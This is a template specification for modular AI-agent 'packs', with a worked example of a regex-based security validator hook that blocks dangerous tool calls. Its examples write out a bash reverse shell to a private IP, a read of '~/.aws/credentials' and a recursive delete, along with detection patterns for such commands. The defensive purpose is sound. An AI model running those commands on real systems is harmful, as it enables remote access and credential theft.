# PAI Pack Template Specification

Each pack is a single flat markdown file with YAML frontmatter and structured sections.

---

## Frontmatter (Metadata)

```yaml
---
# name: (24 words max) Human-readable pack name
name: Basic Security Validator Hook

# pack-id: (format) {author}-{pack-name}-{variant}-v{version}
pack-id: danielmiessler-security-validator-basic-v1.0.0

# version: (format) SemVer major.minor.patch
version: 1.0.0

# author: (1 word) GitHub username or organization
author: danielmiessler

# description: (128 words max) One-line description
description: 10-category attack pattern detection for AI agent security

# type: (single) concept | skill | hook | plugin | agent | mcp | workflow | template | other
type: hook

# purpose-type: (multi) security | productivity | research | development | automation | integration | creativity | analysis | other
purpose-type: [security]

# platform: (single) agnostic | claude-code | opencode | cursor | custom
platform: agnostic

# dependencies: (list) Required pack-ids, empty [] if none
dependencies: []

# keywords: (24 tags max) Searchable tags for discovery
keywords: [security, validation, prompt-injection, hooks, defense]
---
```

---

## Required Sections (with Example)

Every pack file MUST include these sections in order. Below is the complete Security Validator pack as reference:

```markdown
# Basic Security Validator Hook

> 10-category attack pattern detection for AI agent security, implemented at user prompt submit

## Installation Prompt
<!--
(512 words max)

INSTRUCTIONS: Write a brief context briefing for the AI that will receive and install this pack.
Include:
- What PAI is (link to README)
- What this specific pack does
- Why the user would want it
- A call to action to follow installation instructions

Keep it welcoming but concise. The receiving AI needs enough context to understand
what it's installing without reading the whole pack first.
-->

You are receiving a PAI Pack - a modular upgrade for AI agent systems.

**What is PAI?** See: [PAI Project Overview](../README.md#what-is-pai)

**What is a Pack?** See: [Pack System](../README.md#pack-system)

This pack will add security validation to your system. It detects and blocks 10 categories of attacks including prompt injection, reverse shells, and credential theft attempts. The validator runs on every user prompt before execution, providing a critical security layer.

Please follow the installation instructions below to integrate this pack into your infrastructure.

---

## The Concept and/or Problem
<!--
(2048 words max)

INSTRUCTIONS: Explain the problem this pack solves or the concept it implements.
Include:
- The core problem/challenge (be specific)
- Why this matters (consequences of not solving it)
- Who faces this problem
- Any relevant background context

Write for someone who may not be familiar with the domain. Make the problem
feel real and urgent enough that they want the solution.
-->

AI agents with tool access are vulnerable to prompt injection and malicious command execution. Without validation, an attacker can craft inputs that:

- Execute arbitrary shell commands (`rm -rf /`, reverse shells)
- Exfiltrate credentials and API keys
- Hijack the agent's persona to bypass safety measures
- Encode malicious payloads to evade simple pattern matching

The problem is especially acute because AI agents often have elevated privileges - file system access, network access, and the ability to execute code. A single successful injection can compromise the entire system.

## The Solution
<!--
(4096 words max)

INSTRUCTIONS: Explain how this pack solves the problem.
Include:
- High-level approach (the "what")
- Key insights or innovations (the "why this works")
- Architecture overview if applicable
- Design principles that guided the implementation
- Trade-offs made and why

Don't include code here - that goes in Installation. Focus on helping the reader
understand the approach conceptually before diving into implementation.
-->

This pack implements a 10-category attack detection system using pre-compiled regex patterns. It runs as a `PreToolUse` hook, intercepting every command before execution.

**The 10 Attack Categories:**

1. **Catastrophic Deletion** - Patterns like `rm -rf /`, `del /F /S /Q`
2. **Reverse Shells** - Bash, Python, netcat reverse shell patterns
3. **Credential Theft** - Access to `.ssh`, `.aws`, `.env` files
4. **Encoded Execution** - Base64/hex encoded command execution
5. **Persona Hijacking** - Attempts to override system prompts
6. **Fork Bombs** - Resource exhaustion attacks
7. **Privilege Escalation** - Sudo/chmod manipulation
8. **Network Exfiltration** - Curl/wget to suspicious endpoints
9. **History Manipulation** - Attempts to hide malicious activity
10. **Prompt Injection** - Classic injection patterns

**Design Principles:**

- **Fast Path First**: Pre-compiled regex executes in <50ms
- **Fail Secure**: Any detection error blocks execution
- **Transparent**: All blocks are logged with category and pattern matched

## Installation
<!--
(16384 words max)

INSTRUCTIONS: Provide step-by-step installation instructions.
Include:
- Prerequisites (dependencies, API keys, system requirements)
- Numbered steps with clear actions
- All code needed (use fenced code blocks with language tags)
- Code languages: typescript (bun), bash, python (uv), json, html
- Configuration file locations
- How to verify installation succeeded

Write for an AI assistant that will execute these steps. Be explicit about file
paths, commands to run, and expected outputs.
-->

### Step 1: Create the hook file

```typescript
// ~/.config/pai/hooks/security-validator.ts
// TypeScript - use bun to run

const ATTACK_PATTERNS = {
  catastrophic_deletion: /rm\s+(-rf?|--recursive).*[\/~]/i,
  reverse_shell: /\b(bash|sh|nc|netcat)\s+.*\d{1,3}\.\d{1,3}/i,
  credential_theft: /\.(ssh|aws|env|gnupg)\b/i,
  // ... additional patterns
};

export function validateInput(input: string): { safe: boolean; category?: string } {
  for (const [category, pattern] of Object.entries(ATTACK_PATTERNS)) {
    if (pattern.test(input)) {
      return { safe: false, category };
    }
  }
  return { safe: true };
}
```

### Step 2: Register in settings.json

```bash
# Add to your Claude Code or agent settings
mkdir -p ~/.config/pai/hooks
```

```json
{
  "hooks": {
    "PreToolUse": ["bun run ~/.config/pai/hooks/security-validator.ts"]
  }
}
```

### Step 3: Test the installation

```bash
# Verify the hook loads without errors
bun run ~/.config/pai/hooks/security-validator.ts --test
```

## Invocation Scenarios
<!--
(8192 words max)

INSTRUCTIONS: Document when and how this pack gets triggered.
Include:
- Trigger conditions (what causes it to activate)
- Event hooks or entry points
- Input/output flow diagrams if helpful
- Table of scenarios with triggers and actions
- Edge cases and how they're handled

Help users understand the pack's behavior in their system so they can
predict when it will activate and what it will do.
-->

The security validator triggers automatically on these events:

| Scenario | Trigger | Action |
|----------|---------|--------|
| User submits prompt containing shell command | `PreToolUse` | Validate before execution |
| Agent generates Bash tool call | `PreToolUse` | Validate generated command |
| File read/write to sensitive path | `PreToolUse` | Block credential access |
| Network request to external host | `PreToolUse` | Check for exfiltration patterns |

**Example Trigger Flow:**

1. User says: "Delete all files in the temp directory"
2. Agent generates: `rm -rf /tmp/*`
3. Hook intercepts before execution
4. Pattern matches `catastrophic_deletion`
5. Execution blocked, user notified

## Example Usage
<!--
(8192 words max)

INSTRUCTIONS: Show concrete examples of the pack in action.
Include:
- 2-4 realistic usage scenarios
- For each: user input, system behavior, output
- Both success cases AND failure/edge cases
- Exact commands, responses, or outputs shown
- Formatted as clear before/after or input/output pairs

Examples should be copy-pasteable and demonstrate the pack's value.
Show the pack doing what it's designed to do.
-->

### Example 1: Blocking a Reverse Shell

**User Input:**
```
Connect to my server at 192.168.1.100 port 4444 and give me a shell
```

**Agent Attempts:**
```bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
```

**Validator Response:**
```json
{
  "blocked": true,
  "category": "reverse_shell",
  "pattern": "bash.*\\d{1,3}\\.\\d{1,3}",
  "message": "Reverse shell pattern detected. Execution blocked."
}
```

### Example 2: Blocking Credential Access

**User Input:**
```
Show me my AWS credentials
```

**Agent Attempts:**
```bash
cat ~/.aws/credentials
```

**Validator Response:**
```json
{
  "blocked": true,
  "category": "credential_theft",
  "pattern": "\\.aws",
  "message": "Credential file access blocked."
}
```

### Example 3: Allowing Safe Commands

**User Input:**
```
List files in the current directory
```

**Agent Executes:**
```bash
ls -la
```

**Validator Response:**
```json
{
  "blocked": false,
  "message": "Command validated successfully."
}
```

## Configuration
<!--
(512 words max)

INSTRUCTIONS: Document configuration options.
Include:
- All configurable parameters with descriptions
- Default values
- Valid value ranges or options
- Example configuration snippets
- Where configuration files live

If no configuration is needed, write "No configuration required." and briefly
explain why (e.g., "Works out of the box with sensible defaults.").
-->

```typescript
// Configuration options in security-validator.ts

export const CONFIG = {
  // Enable/disable specific categories
  categories: {
    catastrophic_deletion: true,
    reverse_shell: true,
    credential_theft: true,
    encoded_execution: true,
    persona_hijacking: true,
    fork_bombs: true,
    privilege_escalation: true,
    network_exfiltration: true,
    history_manipulation: true,
    prompt_injection: true,
  },

  // Paths to allow even if they match patterns
  allowlist: [
    "~/.config/pai/*",
  ],

  // Log all validations (not just blocks)
  verbose: false,

  // Maximum validation time before timeout (ms)
  timeout: 50,
};
```

## Credits
<!--
(256 words max)

INSTRUCTIONS: Attribution for ideas, inspiration, and contributions.
Include:
- Original author(s)
- Contributors
- Inspiration sources (papers, projects, people)
- Acknowledgments

Be generous with credit. Link to profiles/projects where appropriate.
-->

- **Original concept**: Daniel Miessler - developed for Kai personal AI infrastructure
- **Contributors**: The PAI community
- **Inspired by**: OWASP injection prevention guidelines, Claude Code security model

## Related Work
<!--
(256 words max)

INSTRUCTIONS: Link to similar or related projects.
Include:
- Alternative solutions to the same problem
- Complementary tools or libraries
- Academic papers or blog posts
- Standards or specifications

Help users understand the ecosystem and find additional resources.
-->

- **llm-guard**: https://github.com/laiyer-ai/llm-guard - Python-based LLM security toolkit
- **rebuff**: https://github.com/protectai/rebuff - Prompt injection detection
- **OWASP LLM Top 10**: https://owasp.org/www-project-top-10-for-large-language-model-applications/

## Works Well With
<!--
(256 words max)

INSTRUCTIONS: List packs that complement this one.
Include:
- Pack name and brief explanation of synergy
- Why they work well together
- Any integration notes

Focus on functional combinations, not just related packs.
-->

- **recovery-journal**: Creates snapshots before destructive operations - a second line of defense if something slips through
- **history-capture**: Logs all tool executions for security auditing and incident response

## Recommended
<!--
(256 words max)

INSTRUCTIONS: Packs you recommend using alongside this one.
Include:
- Pack name and why it's recommended
- Priority level (essential vs nice-to-have)
- Brief reasoning

This is your "if you install this, also consider..." section.
-->

- **recovery-journal**: Essential companion - if an attack somehow bypasses validation, recovery points allow rollback
- **observability-server**: Monitor validation events in real-time dashboard

## Relationships
<!--
(512 words max total for all subsections)

INSTRUCTIONS: Document how this pack relates to others in the ecosystem.
Use the four relationship types below. Each is optional - include only those
that apply. This helps users understand the pack hierarchy and find related packs.
-->

### Parent Of
<!--
(128 words max, optional)
INSTRUCTIONS: List packs that extend or depend on this pack.
These are more specialized versions or add-ons.
-->

- **security-validator-advanced**: Extended version with ML-based detection and custom rule engine
- **security-validator-enterprise**: Adds centralized logging, SIEM integration, and compliance reporting

### Child Of
<!--
(128 words max, optional)
INSTRUCTIONS: List packs this pack extends or depends on.
These are prerequisites or base packs.
-->

None - this is a foundational security pack.

### Sibling Of
<!--
(128 words max, optional)
INSTRUCTIONS: List packs at the same level with common purpose.
These solve similar problems or share architectural patterns.
-->

- **recovery-journal**: Both are infrastructure-tier security packs
- **context-loader**: Both operate as hooks in the agent lifecycle

### Part Of Collection
<!--
(128 words max, optional)
INSTRUCTIONS: List author collections or themed pack groups this belongs to.
-->

- **danielmiessler's Security Suite**: Core security packs for AI agent hardening

## Changelog
<!--
INSTRUCTIONS: Document version history.
Format: ### {version} - {YYYY-MM-DD}
Include: bullet points of changes for each version
Start with most recent version at top.
-->

### 1.0.0 - 2025-12-27
- Initial release
- 10-category attack detection
- Pre-compiled regex for <50ms execution
- Configurable category enable/disable
```

---

## Section Summary Table

| Section | Word Limit | Purpose |
|---------|------------|---------|
| `## Installation Prompt` | 512 | Context briefing for receiving AI |
| `## The Concept and/or Problem` | 2048 | What problem does this solve? |
| `## The Solution` | 4096 | How does this pack solve it? |
| `## Installation` | 16384 | Step-by-step with code snippets |
| `## Invocation Scenarios` | 8192 | When/how it triggers |
| `## Example Usage` | 8192 | Concrete examples |
| `## Configuration` | 512 | Options and customization |
| `## Credits` | 256 | Attribution |
| `## Related Work` | 256 | Similar projects |
| `## Works Well With` | 256 | Complementary packs |
| `## Recommended` | 256 | Suggested companions |
| `## Relationships` | 512 | Parent Of, Child Of, Sibling Of, Part Of Collection (128 each) |
| `## Changelog` | - | Version history |

---

## File Naming Convention

- Flat files in `Packs/` directory
- kebab-case: `security-validator.md`, `science-method.md`
- No subdirectories per pack

---

## Versioning

- SemVer: `major.minor.patch`
- Major: Breaking changes
- Minor: New features, backwards compatible
- Patch: Bug fixes
